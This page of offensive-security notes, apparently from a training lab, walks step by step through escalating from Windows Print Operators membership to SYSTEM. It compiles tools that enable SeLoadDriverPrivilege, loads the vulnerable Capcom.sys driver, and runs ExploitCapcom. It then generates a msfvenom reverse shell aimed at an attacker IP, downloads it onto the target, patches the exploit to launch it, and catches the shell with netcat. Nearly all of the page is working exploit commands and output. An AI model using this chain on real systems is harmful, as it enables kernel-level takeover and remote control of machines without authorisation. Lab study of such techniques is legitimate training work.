# Print Operators

## Current User Groups

```pwsh
PS C:\Users\printsvc> whoami /groups
```

```output title="Output" hl_lines="7"
GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

## Current User Privileges

```pwsh
PS C:\Users\printsvc> whoami /priv
```

```output title="Output" hl_lines="7"
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeLoadDriverPrivilege         Load and unload device drivers Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

## Getting Ready

### Manual Method

#### [EnableSeLoadDriverPrivilege](https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeLoadDriverPrivilege.cpp)

=== "ORIGINAL"

    ```cpp title="EnableSeLoadDriverPrivilege.cpp" linenums="1"
    /*
    Reference:
    https://github.com/hatRiot/token-priv
    https://github.com/TarlogicSecurity/EoPLoadDriver

    Enable the SeLoadDriverPrivilege of current process and then load the driver into the kernel.

    First you need to add two reg keys,the command is:
    reg add hkcu\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\test\Capcom.sys"
    reg add hkcu\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
    Then run me to load the driver(C:\test\Capcom.sys) into the kernel.

    We will have all access on the system.
    */


    #include <windows.h>
    #include <assert.h>
    #include <winternl.h>
    #include <sddl.h>
    #pragma comment(lib,"advapi32.lib")
    #pragma comment(lib,"user32.lib")
    #pragma comment(lib,"Ntdll.lib")
    ```

=== "FIX"

    ```cpp title="EnableSeLoadDriverPrivilege.cpp" linenums="1" hl_lines="15-16"
    /*
    Reference:
    https://github.com/hatRiot/token-priv
    https://github.com/TarlogicSecurity/EoPLoadDriver

    Enable the SeLoadDriverPrivilege of current process and then load the driver into the kernel.

    First you need to add two reg keys,the command is:
    reg add hkcu\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\test\Capcom.sys"
    reg add hkcu\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
    Then run me to load the driver(C:\test\Capcom.sys) into the kernel.

    We will have all access on the system.
    */
    #include <stdio.h>
    #include "tchar.h"
    #include <windows.h>
    #include <assert.h>
    #include <winternl.h>
    #include <sddl.h>
    #pragma comment(lib,"advapi32.lib")
    #pragma comment(lib,"user32.lib")
    #pragma comment(lib,"Ntdll.lib")
    ```

```pwsh
PS C:\Users\printsvc> cl.exe /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

```output title="Output" hl_lines="8"
Microsoft (R) C/C++ Optimizing Compiler Version 19.44.35211 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker Version 14.44.35211.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.obj
```

#### Referencing [Capcom](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) Driver

```pwsh
PS C:\Users\printsvc> reg add "HKCU\System\CurrentControlSet\Capcom" /v Type /t REG_DWORD /d 1 /f
PS C:\Users\printsvc> reg add "HKCU\System\CurrentControlSet\Capcom" /v ImagePath /t REG_EXPAND_SZ /d "\??\C:\Tools\Capcom.sys" /f
```

#### Enabling the Privilege

```pwsh
PS C:\Users\printsvc> .\EnableSeLoadDriverPrivilege.exe
```

```output title="Output" hl_lines="6"
whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege                         Disabled
SeLoadDriverPrivilege                             Enabled
SeShutdownPrivilege                               Disabled
SeChangeNotifyPrivilege                           Enabled by default
SeIncreaseWorkingSetPrivilege                     Disabled
NTSTATUS: 00000000, WinError: 0
```

#### Driver Verify

```pwsh
PS C:\Users\printsvc> C:\Tools\DriverView.exe /stext drivers.txt
PS C:\Users\printsvc> cat drivers.txt | Select-String -Pattern Capcom
```

```output title="Output"
Driver Name       : Capcom.sys
Filename          : C:\Tools\Capcom.sys
```

### Automated Method

#### [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)

=== "ORIGINAL"

    ```cpp title="eoploaddriver.cpp" linenums="1"
    // EoPLoadDriver PoC by Oscar Mallo (Tarlogic)

    // If you have any suggestion or problem feel free to open an issue :)


    #include "stdafx.h"
    #include <Windows.h>
    #include <Winternl.h>
    #include <tchar.h>
    #include <stdio.h>
    #include <sddl.h>
    #include <shellapi.h>
    #include <strsafe.h>
    ```

=== "FIX"

    ```cpp title="eoploaddriver.cpp" linenums="1" hl_lines="6-8"
    // EoPLoadDriver PoC by Oscar Mallo (Tarlogic)

    // If you have any suggestion or problem feel free to open an issue :)



    #include <windows.h>
    #include <winternl.h>
    #include <tchar.h>
    #include <stdio.h>
    #include <sddl.h>
    #include <shellapi.h>
    #include <strsafe.h>
    ```

```sh
my@attack:~$ x86_64-w64-mingw32-gcc -o eoploaddriver.exe eoploaddriver.cpp
```

#### Executing

```pwsh
PS C:\Users\printsvc> reg delete "HKCU\System\CurrentControlSet\Capcom" /f
PS C:\Users\printsvc> C:\Tools\eoploaddriver.exe "System\CurrentControlSet\Capcom" C:\Tools\Capcom.sys
```

```output title="Output"
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: 00000000, WinError: 0
```

## [ExploitCapcom](https://github.com/tandasat/ExploitCapcom)

```pwsh
PS C:\Users\printsvc> C:\Tools\ExploitCapcom\ExploitCapcom\x64\Debug\ExploitCapcom.exe
```

## [ExploitCapcom](https://github.com/tandasat/ExploitCapcom/blob/master/ExploitCapcom/ExploitCapcom/ExploitCapcom.cpp#L408-L423) (Reverse Shell)

### Creating the Payload

```sh
my@attack:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.164 LPORT=9001 -f exe -o shell.exe
```

### Web Server

```sh
my@attack:~$ python3 -m http.server 8888
```

### Transferring

```pwsh
PS C:\Users\printsvc> Invoke-WebRequest -Uri "http://10.10.14.164:8888/shell.exe" -OutFile "C:\ProgramData\shell.exe"
```

### Code Modification

=== "BEFORE"

    ```cpp title="ExploitCapcom.cpp" linenums="408"
    static bool LaunchShell()
    {
        TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
        PROCESS_INFORMATION ProcessInfo;
        STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
        if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
            CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
            &ProcessInfo))
        {
            return false;
        }

        CloseHandle(ProcessInfo.hThread);
        CloseHandle(ProcessInfo.hProcess);
        return true;
    }
    ```

=== "AFTER"

    ```cpp title="ExploitCapcom.cpp" linenums="408" hl_lines="3"
    static bool LaunchShell()
    {
        TCHAR CommandLine[] = TEXT("C:\\ProgramData\\shell.exe");
        PROCESS_INFORMATION ProcessInfo;
        STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
        if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
            CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
            &ProcessInfo))
        {
            return false;
        }

        CloseHandle(ProcessInfo.hThread);
        CloseHandle(ProcessInfo.hProcess);
        return true;
    }
    ```

### Netcat

```sh
my@attack:~$ nc -lvnp 9001
```

### Reverse Shell

```pwsh
PS C:\Users\printsvc> C:\Tools\ExploitCapcom\ExploitCapcom\x64\Debug\ExploitCapcom.exe
```
